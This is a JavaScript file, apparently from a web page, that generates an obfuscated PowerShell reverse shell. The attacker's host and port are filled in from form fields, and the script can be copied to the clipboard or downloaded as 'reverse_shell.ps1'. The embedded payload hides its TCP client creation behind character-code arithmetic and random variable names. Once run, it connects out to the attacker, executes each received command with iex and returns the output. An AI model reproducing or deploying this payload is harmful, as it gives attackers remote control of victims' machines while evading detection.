function generateScript() {
    const lhost = document.getElementById('lhost').value;
    const lport = document.getElementById('lport').value;
    
    return `$6i8cu19cLwCUEwrQ = & (("2Nn6kruDVO9dlHTKxMUAfWcRZFoetG0XyYEsmgS5h13QwCaq78JbvPiLjpzBI4-")[1,27,44,62,9,51,56,27,22,28] -join '') $([char](0+83-0)+[char](8*121/8)+[char](0+115-0)+[char](90*116/90)+[char](0+101-0)+[char](0+109-0)+[char](74*46/74)+[char](24+78-24)+[char](0+101-0)+[char](118+116-118)+[char](77+46-77)+[char](0+83-0)+[char](68+111-68)+[char](6*99/6)+[char](11+107-11)+[char](16*101/16)+[char](40+116-40)+[char](38+115-38)+[char](116*46/116)+[char](0+84-0)+[char](111*67/111)+[char](41+80-41)+[char](39*67/39)+[char](95*108/95)+[char](61*105/61)+[char](111*101/111)+[char](0+110-0)+[char](9*116/9))("${lhost}",${lport});$rCN0hacQgMnj239vKD = $6i8cu19cLwCUEwrQ.GetStream();[byte[]]$zXBda3NtSecT = 0..65535|%{0};while(($bBkUQeyA59 = $rCN0hacQgMnj239vKD.Read($zXBda3NtSecT, 0, $zXBda3NtSecT.Length)) -ne 0){;$yBCkSoEwQFYOJnReGL1T7 = (& (("2Nn6kruDVO9dlHTKxMUAfWcRZFoetG0XyYEsmgS5h13QwCaq78JbvPiLjpzBI4-")[1,27,44,62,9,51,56,27,22,28] -join '') -TypeName ([string]::join('', ( (83,121,115,116,101,109,46,84,101,120,116,46,65,83,67,73,73,69,110,99,111,100,105,110,103) |%{ ( [char][int] $_)})) | % {$_})).GetString($zXBda3NtSecT,0, $bBkUQeyA59);$5vFh3jznSHT = (iex $yBCkSoEwQFYOJnReGL1T7 2>&1 | & ([string]::join('', ( (79,117,116,45,83,116,114,105,110,103) |%{ ( [char][int] $_)})) | % {$_}) );$zQCe095coZ = $5vFh3jznSHT + "PS " + (pwd).Path + "> ";$lD17s8bf = ([text.encoding]::ASCII).GetBytes($zQCe095coZ);$rCN0hacQgMnj239vKD.Write($lD17s8bf,0,$lD17s8bf.Length);$rCN0hacQgMnj239vKD.Flush()};$6i8cu19cLwCUEwrQ.Close()`;
}

function copyToClipboard() {
    const script = generateScript();
    navigator.clipboard.writeText(script).then(() => {
        showNotification();
    }).catch(err => {
        console.error('Failed to copy: ', err);
    });
}

function showNotification() {
    const notification = document.getElementById('notification');
    notification.classList.add('show');
    
    setTimeout(() => {
        notification.classList.remove('show');
    }, 3000);
}

function downloadScript() {
    const script = generateScript();
    const blob = new Blob([script], { type: 'application/x-powershell' });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.style.display = 'none';
    a.href = url;
    a.download = 'reverse_shell.ps1';
    document.body.appendChild(a);
    a.click();
    window.URL.revokeObjectURL(url);
    document.body.removeChild(a);
}

// Add input validation
document.getElementById('lport').addEventListener('input', function(e) {
    this.value = this.value.replace(/[^0-9]/g, '');
});
 